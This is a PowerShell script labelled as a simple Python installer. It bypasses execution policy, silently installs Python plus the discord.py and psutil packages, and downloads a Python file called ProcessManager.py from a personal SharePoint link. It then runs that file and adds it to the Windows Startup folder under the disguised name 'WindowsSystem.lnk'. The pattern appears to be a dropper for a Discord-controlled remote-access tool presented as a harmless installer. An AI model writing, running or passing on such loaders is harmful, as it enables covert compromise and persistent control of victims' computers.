# Simple Python Installer and Script Runner - Windows 10/11 Compatible
# Save as .ps1 file

# Bypass execution policy for Windows 10
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue

# Check if Python is installed
try {
    python --version 2>$null
    $pythonInstalled = $true
    Write-Host "Python is already installed" -ForegroundColor Green
} catch {
    $pythonInstalled = $false
    Write-Host "Python not found, installing..." -ForegroundColor Yellow
}

# Install Python if not found
if (-not $pythonInstalled) {
    # Download Python
    $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
    $installerPath = "$env:TEMP\python_installer.exe"
    
    Write-Host "Downloading Python..." -ForegroundColor Yellow
    try {
        Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -UseBasicParsing
    } catch {
        # Fallback download method
        (New-Object Net.WebClient).DownloadFile($pythonUrl, $installerPath)
    }
    
    # Install Python silently
    Write-Host "Installing Python..." -ForegroundColor Yellow
    Start-Process -FilePath $installerPath -ArgumentList @(
        "/quiet",
        "InstallAllUsers=0",
        "PrependPath=1",
        "Include_test=0", 
        "Include_pip=1",
        "Include_launcher=0"
    ) -Wait
    
    # Wait for installation
    Start-Sleep -Seconds 10
    Write-Host "Python installed successfully" -ForegroundColor Green
}

# Install required packages
Write-Host "Installing required packages..." -ForegroundColor Yellow
Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", "discord.py", "psutil", "--quiet", "--user" -Wait

# Download and run the main script
Write-Host "Downloading main script..." -ForegroundColor Yellow
$scriptUrl = "https://trioworldacademy1-my.sharepoint.com/:u:/g/personal/namanreddykaliki_trioworldacademy_com/ET8GO_7FfCdImpWbGYD-zREB9WkwjG6K5Zoo9dn0xghp9g?e=PanmFy&download=1"
$scriptPath = "$env:USERPROFILE\ProcessManager.py"

try {
    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing
} catch {
    (New-Object Net.WebClient).DownloadFile($scriptUrl, $scriptPath)
}

Write-Host "Running script..." -ForegroundColor Green
Start-Process -FilePath "python" -ArgumentList $scriptPath

# Add to startup
Write-Host "Setting up startup..." -ForegroundColor Yellow
$startupPath = [Environment]::GetFolderPath("Startup")
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$startupPath\WindowsSystem.lnk")
$shortcut.TargetPath = "python"
$shortcut.Arguments = "`"$scriptPath`""
$shortcut.WorkingDirectory = "$env:USERPROFILE"
$shortcut.Save()

Write-Host "Setup completed! Script will run on startup." -ForegroundColor Green
